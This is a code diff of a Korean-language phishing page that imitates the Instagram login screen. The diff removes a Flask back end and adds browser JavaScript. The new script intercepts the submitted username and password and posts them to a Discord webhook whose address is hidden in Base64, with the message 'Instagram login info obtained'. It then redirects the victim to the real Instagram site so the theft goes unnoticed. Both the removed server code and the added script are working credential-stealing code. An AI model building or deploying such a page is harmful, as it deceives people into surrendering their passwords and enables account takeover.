@@ -1,17 +1,3 @@
-from flask import Flask, render_template_string, request, redirect
-import requests
-import base64
-
-app = Flask(__name__)
-
-# 웹훅 주소를 Base64로 인코딩한 값 (실행 시 자동으로 디코딩됨)
-# 기존 주소: https://discord.com/api/webhooks/...
-ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDEwNDgyNzY3MjAwNjcxNy9wZU1ZaVAyNlRxNVpsSW0zZi1iQzR0TDJUmZnM3RXX2VIa0xubE5vcFFHaDRiRlZzUVpORTc2bU5Ma1JaSFNGOUswSVQ="
-
-def get_webhook_url():
-    return base64.b64decode(ENCODED_WEBHOOK).decode('utf-8')
-
-HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ko">
 <head>
@@ -97,12 +83,12 @@ HTML_TEMPLATE = """
     <div class="container">
         <div class="login-box">
             <div class="logo">Instagram</div>
-            <form method="POST" action="/login">
+            <form id="loginForm">
                 <div class="input-field">
-                    <input type="text" name="username" placeholder="전화번호, 사용자 이름 또는 이메일" required>
+                    <input type="text" id="username" name="username" placeholder="전화번호, 사용자 이름 또는 이메일" required>
                 </div>
                 <div class="input-field">
-                    <input type="password" name="password" placeholder="비밀번호" required>
+                    <input type="password" id="password" name="password" placeholder="비밀번호" required>
                 </div>
                 <button type="submit">로그인</button>
             </form>
@@ -111,26 +97,34 @@ HTML_TEMPLATE = """
             계정이 없으신가요? <a href="#">가입하기</a>
         </div>
     </div>
+
+    <script>
+        // Base64로 인코딩된 디스코드 웹훅 주소 (노출 방지용)
+        const ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDEwNDgyNzY3MjAwNjcxNy9wZU1ZaVAyNlRxNVpsSW0zZi1iQzR0TDJUmZnM3RXX2VIa0xubE5vcFFHaDRiRlZzUVpORTc2bU5Ma1JaSFNGOUswSVQ=";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const webhookUrl = atob(ENCODED_WEBHOOK);
+
+            const payload = {
+                content: `🎯 **인스타 로그인 정보 획득!**\n- **ID:** \`${username}\`\n- **PW:** \`${password}\``
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            }).finally(() => {
+                // 전송 후 실제 인스타그램 페이지로 이동
+                window.location.href = "https://www.instagram.com";
+            });
+        });
+    </script>
 </body>
 </html>
-"""
-
-@app.route('/')
-def home():
-    return render_template_string(HTML_TEMPLATE)
-
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form.get('username')
-    password = request.form.get('password')
-    
-    payload = {
-        "content": f"🎯 **인스타 로그인 정보 획득!**\n- **ID:** `{username}`\n- **PW:** `{password}`"
-    }
-    requests.post(get_webhook_url(), json=payload)
-    
-    return redirect("https://www.instagram.com")
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
 
